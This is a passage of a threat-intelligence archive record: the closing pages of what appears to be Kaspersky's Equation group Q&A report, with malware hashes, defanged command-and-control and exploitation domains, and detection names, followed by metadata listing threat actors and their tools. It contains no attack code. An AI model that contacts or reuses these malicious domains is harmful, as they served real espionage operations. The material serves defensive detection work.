and the knowledge and\nresources required to implement something like it, the mechanism appears to be out\nof the reach of most advanced threat groups in the world except the EQUATION group.\n\nThese as well as other general observations lead us to conclude that the EQUATION\ngroup surpasses Regin in sophistication and resources.\n\n## 18. How did you discover this malware?\n\nWe discovered one of the first EQUATIONDRUG modules during our research\n[into the Regin nation-state APT operation.](http://securelist.com/blog/research/67741/regin-nation-state-ownage-of-gsm-networks/)\n\nSomewhere in the Middle East, there is a computer we are calling the\n[“The Magnet of Threats” because in addition to Regin, it was also infected](https://securelist.com/blog/research/67741/regin-nation-state-ownage-of-gsm-networks/)\n[by Turla, ItaDuke, Animal Farm and Careto/Mask. When we tried to analyze](http://securelist.com/analysis/publications/65545/the-epic-turla-operation/)\nthe Regin infection on this computer, we identified another module which did\nnot appear to be part of the Regin infection, nor any of the other APTs.\n\n\n-----\n\n32\n\nFurther investigation into this module led us to the discovery of the\nEQUATIONDRUG platform.\n\nBy looking for similarities using statistical analysis and correlation as\nwell as C&C-based pivoting, we identified several other malware families:\nDOUBLEFANTASY, EQUATIONLASER and FANNY. Further research enabled\nus to find GRAYFISH and TRIPLEFANTASY.\n\nAnother interesting detail is that several EQUATION group victims appear to\nhave been previously infected by Regin and, in one case, had both Regin and\nEQUATIONDRUG. This makes us believe the two groups are different from each other.\n\n## Indicators of compromise (“one of each”)\n\n|Name|EquationLaser|\n|---|---|\n|MD5|752af597e6d9fd70396accc0b9013dbe|\n|Type|EquationLaser installer|\n|Compiled|Mon Oct 18 15:24:05 2004|\n\n|Name|Disk from Houston “autorun.exe” with EoP exploits|\n|---|---|\n|MD5|6fe6c03b938580ebf9b82f3b9cd4c4aa|\n|Type|EoP package and malware launcher|\n|Compiled|Wed Dec 23 15:37:33 2009|\n\n|Name|DoubleFantasy|\n|---|---|\n|MD5|2a12630ff976ba0994143ca93fecd17f|\n|Type|DoubleFantasy installer|\n|Compiled|Fri Apr 30 01:03:53 2010|\n\n|Name|EquationDrug|\n|---|---|\n|MD5|4556ce5eb007af1de5bd3b457f0b216d|\n|Type|EquationDrug installer (“LUTEUSOBSTOS”)|\n|Compiled|Tue Dec 11 20:47:12 2007|\n\n\n-----\n\n33\n\n|Name|GrayFish|\n|---|---|\n|MD5|9b1ca66aab784dc5f1dfe635d8f8a904|\n|Type|GrayFish installer|\n|Compiled|Compiled: Fri Feb 01 22:15:21 2008 (installer)|\n\n|Name|Fanny|\n|---|---|\n|MD5|0a209ac0de4ac033f31d6ba9191a8f7a|\n|Type|Fanny worm|\n|Compiled|Mon Jul 28 11:11:35 2008|\n\n|Name|TripleFantasy|Col3|\n|---|---|---|\n|MD5|9180d5affe1e5df0717d7385e7f54386|loader (17920 bytes .DLL)|\n|MD5|ba39212c5b58b97bfc9f5bc431170827|encrypted payload (.DAT)|\n|Compiled|various, possibly fake||\n\n|Name|_SD_IP_CF.dll - unknown|\n|---|---|\n|MD5|03718676311de33dd0b8f4f18cffd488|\n|Type|DoubleFantasy installer + LNK exploit package|\n|Compiled|Fri Feb 13 10:50:23 2009|\n\n|Name|nls_933w.dll|\n|---|---|\n|MD5|11fb08b9126cdb4668b3f5135cf7a6c5|\n|Type|HDD reprogramming module|\n|Compiled|Tue Jun 15 20:23:37 2010|\n\n|Name|standalonegrok_2.1.1.1 / GROK|\n|---|---|\n|MD5|24a6ec8ebf9c0867ed1c097f4a653b8d|\n|Type|GROK keylogger|\n|Compiled|Tue Aug 09 03:26:22 2011|\n\n\n-----\n\n34\n\n### C&C servers (hostnames and IPs):\n\n#### DoubleFantasy:\n\nadvancing-technology[.]com\n\navidnewssource[.]com\n\nbusinessdealsblog[.]com\n\nbusinessedgeadvance[.]com\n\ncharging-technology[.]com\n\ncomputertechanalysis[.]com\n\nconfig.getmyip[.]com - SINKHOLED BY KASPERSKY LAB\n\nglobalnetworkanalys[.]com\n\nmelding-technology[.]com\n\nmyhousetechnews[.]com - SINKHOLED BY KASPERSKY LAB\n\nnewsterminalvelocity[.]com - SINKHOLED BY KASPERSKY LAB\n\nselective-business[.]com\n\nslayinglance[.]com\n\nsuccessful-marketing-now[.]com - SINKHOLED BY KASPERSKY LAB\n\ntaking-technology[.]com\n\ntechasiamusicsvr[.]com - SINKHOLED BY KASPERSKY LAB\n\ntechnicaldigitalreporting[.]com\n\ntimelywebsitehostesses[.]com\n\nwww.dt1blog[.]com\n\nwww.forboringbusinesses[.]com\n\n#### EquationLaser:\n\nlsassoc[.]com - re-registered, not malicious at the moment\n\ngar-tech[.]com - SINKHOLED BY KASPERSKY LAB\n\n#### Fanny:\n\n\n-----\n\n35\n\n\n#### EquationDrug:\n\n\n-----\n\n36\n\n\n-----\n\n37\n\n\n#### GrayFish:\n\nad-noise[.]net\n\nbusiness-made-fun[.]com\n\nbusinessdirectnessource[.]com\n\ncharmedno1[.]com\n\ncribdare2no[.]com\n\ndowelsobject[.]com\n\nfollowing-technology[.]com\n\nforgotten-deals[.]com\n\nfunctional-business[.]com\n\nhousedman[.]com\n\nindustry-deals[.]com\n\nlistennewsnetwork[.]com\n\nphoneysoap[.]com\n\nposed2shade[.]com\n\nquik-serv[.]com\n\nrehabretie[.]com\n\nspeedynewsclips[.]com\n\nteatac4bath[.]com\n\nunite3tubes[.]com\n\nunwashedsound[.]com\n\n#### TripleFantasy:\n\narm2pie[.]com\n\nbrittlefilet[.]com\n\ncigape[.]net\n\ncrisptic01[.]net\n\nfliteilex[.]com\n\nitemagic[.]net\n\nmicraamber[.]net\n\nmimicrice[.]com\n\nrampagegramar[.]com\n\nrubi4edit[.]com\n\nrubiccrum[.]com\n\nrubriccrumb[.]com\n\nteam4heat[.]net\n\ntropiccritics[.]com\n\n\n-----\n\n38\n\n#### Equation group’s exploitation servers:\n\nstandardsandpraiserepurpose[.]com\n\nsuddenplot[.]com\n\ntechnicalconsumerreports[.]com\n\ntechnology-revealed[.]com\n\n#### IPs hardcoded in malware configuration blocks:\n\n\n-----\n\n39\n\n\n#### Kaspersky products detection names:\n\n- Backdoor.Win32.Laserv\n\n- Backdoor.Win32.Laserv.b\n\n- Exploit.Java.CVE-2012-1723.ad\n\n- HEUR:Exploit.Java.CVE-2012-1723.gen\n\n- HEUR:Exploit.Java.Generic\n\n- HEUR:Trojan.Java.Generic\n\n- HEUR:Trojan.Win32.DoubleFantasy.gen\n\n- HEUR:Trojan.Win32.EquationDrug.gen\n\n- HEUR:Trojan.Win32.Generic\n\n- HEUR:Trojan.Win32.GrayFish.gen\n\n- HEUR:Trojan.Win32.TripleFantasy.gen\n\n- Rootkit.Boot.Grayfish.a\n\n- Trojan-Downloader.Win32.Agent.bjqt\n\n- Trojan.Boot.Grayfish.a\n\n- Trojan.Win32.Agent.ajkoe\n\n- Trojan.Win32.Agent.iedc\n\n- Trojan.Win32.Agent2.jmk\n\n- Trojan.Win32.Diple.fzbb\n\n- Trojan.Win32.DoubleFantasy.a\n\n- Trojan.Win32.DoubleFantasy.gen\n\n- Trojan.Win32.EquationDrug.b\n\n- Trojan.Win32.EquationDrug.c\n\n- Trojan.Win32.EquationDrug.d\n\n- Trojan.Win32.EquationDrug.e\n\n- Trojan.Win32.EquationDrug.f\n\n\n-----\n\n40\n\n- Trojan.Win32.EquationDrug.g\n\n- Trojan.Win32.EquationDrug.h\n\n- Trojan.Win32.EquationDrug.i\n\n- Trojan.Win32.EquationDrug.j\n\n- Trojan.Win32.EquationDrug.k\n\n- Trojan.Win32.EquationLaser.a\n\n- Trojan.Win32.EquationLaser.c\n\n- Trojan.Win32.EquationLaser.d\n\n- Trojan.Win32.Genome.agegx\n\n- Trojan.Win32.Genome.akyzh\n\n- Trojan.Win32.Genome.ammqt\n\n- Trojan.Win32.Genome.dyvi\n\n- Trojan.Win32.Genome.ihcl\n\n- Trojan.Win32.Patched.kc\n\n- Trojan.Win64.EquationDrug.a\n\n- Trojan.Win64.EquationDrug.b\n\n- Trojan.Win64.Rozena.rpcs\n\n- Worm.Win32.AutoRun.wzs\n\n\n-----\n\n41\n\n\n#### Yara rules:\n\n\n-----\n\n42\n\n\n-----\n\n43\n\n\n[Securelist, the resource](https://securelist.com/)\nfor Kaspersky Lab experts’\ntechnical research,\nanalysis, and thoughts.\n\n\nFollow us\n\n\nDailyThreatPostBusinessAcademyEugeneSecureList\n\n\nKaspersky Lab global Website DailyThreatPostBusinessAcademyEugene Eugene Kaspersky Blog\n\nDaily Kaspersky Lab B2C Blog DailyBusiness Kaspersky Lab B2B Blog\n\nDailyThreatPostBusinessAcademy Kaspersky Lab security news service DailyBusinessAcademy Kaspersky Lab Academy\n\n\nDailyThreatPostBusinessAcademyEugene\n\n\nDaily\n\n\nDailyThreatPostBusinessAcademy\n\n\n-----\n\n### Kaspersky Lab HQ\n\n39A/3 Leningradskoe Shosse\nMoscow, 125212\nRussian Federation\n\n[more contact details](http://www.kaspersky.com/about/contactinfo/contacts_global_hq)\n\nTel: +7-495-797-8700\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "99fdc3ef-333d-48f5-a4a1-becd788c7b80",
            "created_at": "2022-10-25T15:28:29.802983Z",
            "updated_at": "2022-10-25T15:28:29.802983Z",
            "deleted_at": null,
            "name": "MITRE",
            "url": "https://github.com/mitre-attack/attack-stix-data",
            "description": "MITRE ATT&CK STIX Data",
            "reports": null
        },
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        },
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        },
        {
            "id": "6fc23d14-23a6-4870-8fad-b291b182596f",
            "created_at": "2022-10-25T16:07:18.480113Z",
            "updated_at": "2022-10-25T16:07:18.480113Z",
            "deleted_at": null,
            "name": "ETDA",
            "url": "https://apt.etda.or.th",
            "description": "Threat Group Cards: A Threat Actor Encyclopedia",
            "reports": null
        },
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        },
        {
            "id": "6825b8cb-7d82-43d2-b0b0-d51c7e255b42",
            "created_at": "2023-01-06T13:46:37.642134Z",
            "updated_at": "2023-01-06T13:46:37.642134Z",
            "deleted_at": null,
            "name": "MISPGALAXY",
            "url": "https://www.misp-project.org/galaxy.html",
            "description": "MISP Galaxy Clusters",
            "reports": null
        }
    ],
    "references": [
        "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08064459/Equation_group_questions_and_answers.pdf",
        "https://app.box.com/s/reidof9i3qnjdq4t0k49o392g8r98tbt",
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2015/2015.02.16.equation-the-death-star/Equation_group_questions_and_answers.pdf"
    ],
    "report_names": [
        "Equation_group_questions_and_answers.pdf",
        "Equation_group_questions_and_answers"
    ],
    "threat_actors": [
        {
            "id": "b740943a-da51-4133-855b-df29822531ea",
            "created_at": "2022-10-25T15:50:23.604126Z",
            "updated_at": "2025-03-27T02:00:55.505366Z",
            "deleted_at": null,
            "main_name": "Equation",
            "aliases": [
                "Equation"
            ],
            "source_name": "MITRE:Equation",
            "tools": null,
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "67bf0462-41a3-4da5-b876-187e9ef7c375",
            "created_at": "2022-10-25T16:07:23.44832Z",
            "updated_at": "2025-03-27T02:02:09.806007Z",
            "deleted_at": null,
            "main_name": "Careto",
            "aliases": [
                "Careto",
                "The Mask",
                "Ugly Face"
            ],
            "source_name": "ETDA:Careto",
            "tools": [
                "Careto"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f5bf6853-3f6e-452c-a7b7-8f81c9a27476",
            "created_at": "2023-01-06T13:46:38.677391Z",
            "updated_at": "2025-03-27T02:00:02.889755Z",
            "deleted_at": null,
            "main_name": "Careto",
            "aliases": [
                "The Mask",
                "Ugly Face"
            ],
            "source_name": "MISPGALAXY:Careto",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e09a7338-fb16-4e39-b579-c3bfc3140c47",
            "created_at": "2022-10-25T16:07:24.207294Z",
            "updated_at": "2025-03-27T02:02:10.140203Z",
            "deleted_at": null,
            "main_name": "Snowglobe",
            "aliases": [
                "ATK 8",
                "Animal Farm",
                "SIG20",
                "Snowglobe"
            ],
            "source_name": "ETDA:Snowglobe",
            "tools": [
                "Babar",
                "Casper",
                "Chocopop",
                "Dino",
                "EvilBunny",
                "Nbot",
                "TFC",
                "Tafacalou"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "08623296-52be-4977-8622-50efda44e9cc",
            "created_at": "2023-01-06T13:46:38.549387Z",
            "updated_at": "2025-03-27T02:00:02.859535Z",
            "deleted_at": null,
            "main_name": "Equation Group",
            "aliases": [
                "Tilded Team",
                "EQGRP",
                "G0020"
            ],
            "source_name": "MISPGALAXY:Equation Group",
            "tools": [
                "EquationLaser",
                "EquationDrug",
                "DoubleFantasy",
                "TripleFantasy",
                "GrayFish"
            ],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "9a58d7bb-dd32-41bc-804e-500ef7550cf8",
            "created_at": "2023-01-06T13:46:39.131811Z",
            "updated_at": "2025-03-27T02:00:03.004067Z",
            "deleted_at": null,
            "main_name": "ItaDuke",
            "aliases": [
                "DarkUniverse",
                "SIG27"
            ],
            "source_name": "MISPGALAXY:ItaDuke",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "2d9fbbd7-e4c3-40e5-b751-27af27c8610b",
            "created_at": "2024-05-01T02:03:08.144214Z",
            "updated_at": "2025-03-27T02:05:17.419705Z",
            "deleted_at": null,
            "main_name": "PLATINUM COLONY",
            "aliases": [
                "Equation Group "
            ],
            "source_name": "Secureworks:PLATINUM COLONY",
            "tools": [
                " EquationDrug",
                " EquationLaser",
                " Fanny",
                " GrayFish",
                " TripleFantasy",
                "DoubleFantasy"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a97cf06d-c2e2-4771-99a2-c9dee0d6a0ac",
            "created_at": "2022-10-25T16:07:24.349252Z",
            "updated_at": "2025-03-27T02:02:10.184406Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "ATK 13",
                "Belugasturgeon",
                "Blue Python",
                "CTG-8875",
                "Group 88",
                "ITG12",
                "Iron Hunter",
                "Krypton",
                "Makersmark",
                "Operation Epic Turla",
                "Operation Moonlight Maze",
                "Operation Penguin Turla",
                "Operation Satellite Turla",
                "Operation Skipper Turla",
                "Operation Turla Mosquito",
                "Operation WITCHCOVEN",
                "Pacifier APT",
                "Pensive Ursa",
                "Popeye",
                "SIG15",
                "SIG2",
                "SIG23",
                "Secret Blizzard",
                "TAG-0530",
                "Turla",
                "UNC4210",
                "Venomous Bear",
                "Waterbug"
            ],
            "source_name": "ETDA:Turla",
            "tools": [
                "ASPXSpy",
                "ASPXTool",
                "ATI-Agent",
                "AdobeARM",
                "Agent.BTZ",
                "Agent.DNE",
                "BigBoss",
                "COMpfun",
                "Chinch",
                "Cloud Duke",
                "CloudDuke",
                "CloudLook",
                "Cobra Carbon System",
                "ComRAT",
                "DoublePulsar",
                "EmPyre",
                "EmpireProject",
                "Epic Turla",
                "EternalBlue",
                "EternalRomance",
                "GoldenSky",
                "Group Policy Results Tool",
                "HTML5 Encoding",
                "HyperStack",
                "IcedCoffee",
                "IronNetInjector",
                "KSL0T",
                "Kapushka",
                "Kazuar",
                "KopiLuwak",
                "Kotel",
                "LOLBAS",
                "LOLBins",
                "LightNeuron",
                "Living off the Land",
                "Maintools.js",
                "Metasploit",
                "Meterpreter",
                "MiamiBeach",
                "Mimikatz",
                "MiniDionis",
                "Minit",
                "NBTscan",
                "NETTRANS",
                "NETVulture",
                "Neptun",
                "NetFlash",
                "NewPass",
                "Outlook Backdoor",
                "Penquin Turla",
                "Pfinet",
                "PowerShell Empire",
                "PowerShellRunner",
                "PowerShellRunner-based RPC backdoor",
                "PowerStallion",
                "PsExec",
                "PyFlash",
                "QUIETCANARY",
                "Reductor RAT",
                "RocketMan",
                "SMBTouch",
                "SScan",
                "Satellite Turla",
                "SilentMoon",
                "Sun rootkit",
                "TTNG",
                "TadjMakhal",
                "Tavdig",
                "TinyTurla",
                "TinyTurla Next Generation",
                "TinyTurla-NG",
                "Topinambour",
                "Tunnus",
                "Turla",
                "Turla SilentMoon",
                "TurlaChopper",
                "Uroburos",
                "Urouros",
                "WCE",
                "WITCHCOVEN",
                "WhiteAtlas",
                "WhiteBear",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "Wipbot",
                "WorldCupSec",
                "XTRANS",
                "certutil",
                "certutil.exe",
                "gpresult",
                "nbtscan",
                "nbtstat",
                "pwdump"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "8aaa5515-92dd-448d-bb20-3a253f4f8854",
            "created_at": "2024-06-19T02:03:08.147099Z",
            "updated_at": "2025-03-27T02:05:17.408118Z",
            "deleted_at": null,
            "main_name": "IRON HUNTER",
            "aliases": [
                "Belugasturgeon ",
                "Blue Python ",
                "CTG-8875 ",
                "ITG12 ",
                "KRYPTON ",
                "MAKERSMARK ",
                "Pensive Ursa ",
                "Secret Blizzard ",
                "Turla",
                "UAC-0003 ",
                "UAC-0024 ",
                "UNC4210 ",
                "Venomous Bear ",
                "Waterbug ",
                "ATK13 "
            ],
            "source_name": "Secureworks:IRON HUNTER",
            "tools": [
                " ComRAT",
                " Kazuar",
                " KopiLuwak",
                " LightNeuron",
                " Mosquito",
                " Nautilus",
                " Neuron",
                " Penquin",
                " PoisonFrog",
                " PyFlash",
                " Skipper",
                " Snake",
                " Tavdig",
                " TinyTurla",
                " Tunnus",
                "Carbon-DLL"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a97fee0d-af4b-4661-ae17-858925438fc4",
            "created_at": "2023-01-06T13:46:38.396415Z",
            "updated_at": "2025-03-27T02:00:02.823045Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "Uroburos",
                "Hippo Team",
                "Pacifier APT",
                "MAKERSMARK",
                "ATK13",
                "UAC-0003",
                "IRON HUNTER",
                "Waterbug",
                "TAG_0530",
                "KRYPTON",
                "Popeye",
                "SIG23",
                "UAC-0144",
                "G0010",
                "Blue Python",
                "VENOMOUS Bear",
                "Group 88",
                "Pfinet",
                "ITG12",
                "UNC4210",
                "Secret Blizzard",
                "UAC-0024"
            ],
            "source_name": "MISPGALAXY:Turla",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "548a4081-aa8f-4e2a-bcb3-0c9dfa61944f",
            "created_at": "2023-01-06T13:46:38.443779Z",
            "updated_at": "2025-03-27T02:00:02.835042Z",
            "deleted_at": null,
            "main_name": "SNOWGLOBE",
            "aliases": [
                "Snowglobe",
                "ATK8",
                "Animal Farm"
            ],
            "source_name": "MISPGALAXY:SNOWGLOBE",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e0fed6e6-a593-4041-80ef-694261825937",
            "created_at": "2022-10-25T16:07:23.593572Z",
            "updated_at": "2025-03-27T02:02:09.879892Z",
            "deleted_at": null,
            "main_name": "Equation Group",
            "aliases": [
                "APT-C-40",
                "Platinum Colony",
                "Tilded Team"
            ],
            "source_name": "ETDA:Equation Group",
            "tools": [
                "Bvp47",
                "DEMENTIAWHEEL",
                "DOUBLEFANTASY",
                "DanderSpritz",
                "DarkPulsar",
                "DoubleFantasy",
                "DoubleFeature",
                "DoublePulsar",
                "Duqu",
                "EQUATIONDRUG",
                "EQUATIONLASER",
                "EQUESTRE",
                "Flamer",
                "GRAYFISH",
                "GROK",
                "OddJob",
                "Plexor",
                "Prax",
                "Regin",
                "Skywiper",
                "TRIPLEFANTASY",
                "Tilded",
                "UNITEDRAKE",
                "WarriorPride",
                "sKyWIper"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d11c89bb-1640-45fa-8322-6f4e4053d7f3",
            "created_at": "2022-10-25T15:50:23.509601Z",
            "updated_at": "2025-03-27T02:00:55.487991Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "Turla",
                "IRON HUNTER",
                "Group 88",
                "Waterbug",
                "WhiteBear",
                "Krypton",
                "Venomous Bear",
                "Secret Blizzard",
                "BELUGASTURGEON"
            ],
            "source_name": "MITRE:Turla",
            "tools": [
                "PsExec",
                "nbtstat",
                "ComRAT",
                "netstat",
                "certutil",
                "KOPILUWAK",
                "IronNetInjector",
                "LunarWeb",
                "Arp",
                "Uroburos",
                "PowerStallion",
                "Kazuar",
                "Systeminfo",
                "LightNeuron",
                "Mimikatz",
                "Tasklist",
                "LunarMail",
                "HyperStack",
                "NBTscan",
                "TinyTurla",
                "Penquin",
                "LunarLoader"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1666716502,
    "ts_updated_at": 1743041780,
    "ts_creation_date": 1424774054,
    "ts_modification_date": 1424774071,
    "files": {
        "pdf": "https://archive.orkl.eu/41aa5bd1ed03d80650a89de3649d051f900b958b.pdf",
        "text": "https://archive.orkl.eu/41aa5bd1ed03d80650a89de3649d051f900b958b.txt",
        "img": "https://archive.orkl.eu/41aa5bd1ed03d80650a89de3649d051f900b958b.jpg"
    }
}